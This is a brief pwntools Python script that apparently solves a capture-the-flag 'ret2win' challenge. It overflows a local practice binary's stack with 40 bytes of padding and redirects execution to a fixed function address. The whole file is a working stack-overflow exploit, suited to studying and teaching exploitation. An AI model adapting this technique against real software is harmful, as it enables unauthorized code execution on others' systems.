from pwn import * 
context.update(arch='amd64') 
p = process('./ret2win') 
offset = b'A'*40 
ret2win = p64(0x40075a)

p.write(offset + ret2win) 
print(p.readall())
